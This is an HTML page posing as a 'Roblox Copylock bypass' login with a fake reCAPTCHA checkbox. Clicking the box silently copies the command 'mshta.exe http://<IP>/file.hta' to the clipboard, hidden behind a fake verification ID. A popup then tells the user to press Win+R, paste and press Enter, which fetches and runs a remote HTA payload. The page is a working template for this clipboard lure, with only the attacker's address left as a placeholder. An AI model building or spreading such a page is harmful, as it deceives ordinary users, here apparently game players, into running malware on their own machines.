<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Roblox Copylock bypass</title>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      height: 100vh;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-container {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 40px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(10px);
      color: white;
      position: relative;
    }

    .login-container h2 {
      text-align: center;
      margin-bottom: 30px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    .input-group label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #e0e0e0;
    }

    .input-group input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.2);
      color: #fff;
      outline: none;
      transition: 0.3s;
    }

    .input-group input:focus {
      background: rgba(255, 255, 255, 0.3);
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #6c63ff;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .login-btn:hover {
      background-color: #5848e0;
    }

    .footer-text {
      text-align: center;
      font-size: 13px;
      margin-top: 20px;
      color: #ccc;
    }

    .checkbox-window {
      height: 74px;
      width: 100%;
      background-color: #f9f9f9;
      border-radius: 6px;
      border: 1px solid #d3d3d3;
      display: flex;
      align-items: center;
      padding: 10px;
      margin-bottom: 20px;
      color: #333;
      cursor: pointer;
      position: relative;
    }

    .checkbox {
      width: 28px;
      height: 28px;
      border: 2px solid #c1c1c1;
      background-color: #fff;
      border-radius: 4px;
      margin-right: 15px;
    }

    .captcha-logo {
      margin-left: auto;
      width: 40px;
      height: 40px;
    }

    .verify-window {
      display: none;
      position: absolute;
      top: 85px;
      left: 0;
      background-color: white;
      color: black;
      width: 300px;
      border-radius: 8px;
      padding: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      z-index: 9999;
      font-size: 14px;
    }

    .verify-window code {
      display: inline-block;
      margin-top: 10px;
      font-size: 12px;
      background: #eee;
      padding: 5px;
      border-radius: 4px;
    }

    .verify-window ol {
      margin: 10px 0;
      padding-left: 20px;
    }

    .verify-window li {
      margin-bottom: 6px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Bem-vindo</h2>
    <form id="loginForm" onsubmit="login(event)">
      <div class="input-group">
        <label for="email">game name</label>
        <input type="email" id="game name" required />
      </div>
      <div class="input-group">
        <label for="password">Senha</label>
        <input type="password" id="password" required />
      </div>

      <!-- CAPTCHA falso -->
      <div class="checkbox-window" onclick="triggerCaptcha()" id="captchaBox">
        <div class="checkbox" id="checkbox"></div>
        <span>I'm not a robot</span>
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="captcha-logo" alt="captcha logo">

        <!-- Janela de instruções posicionada corretamente -->
        <div class="verify-window" id="verifyWindow">
          <strong>Complete as instruções:</strong>
          <ol>
            <li>Pressione Win + R</li>
            <li>Cole o código que foi copiado automaticamente</li>
            <li>Pressione Enter</li>
          </ol>
          <p>Você verá:<br>
          <code id="verifyText"></code>
          </p>
        </div>
      </div>

      <button class="login-btn" type="submit">enter</button>
    </form>
    <div class="footer-text">© 2025 Sue Hacked</div>
  </div>

  <script>
    let verified = false;

    function triggerCaptcha() {
      if (verified) return;

      const verificationId = Math.floor(1000 + Math.random() * 9000);
      const command = `mshta.exe http://<IP>/file.hta # ✅ 'I am not a robot - reCAPTCHA Verification ID: ${verificationId}'`;

      // Copia para a área de transferência
      const textarea = document.createElement("textarea");
      textarea.value = command;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);

      // Mostra mensagem de verificação
      const verifyText = document.getElementById("verifyText");
      verifyText.innerText = `✅ 'I am not a robot - reCAPTCHA Verification ID: ${verificationId}'`;

      const verifyWindow = document.getElementById("verifyWindow");
      verifyWindow.style.display = "block";

      verified = true;
    }

    function login(event) {
      event.preventDefault();
      if (!verified) {
        alert("Please complete the robot verification before proceeding.

");
        return;
      }
      const email = document.getElementById("email").value;
      alert("Login simulado para: " + email);
    }
  </script>
</body>
</html>
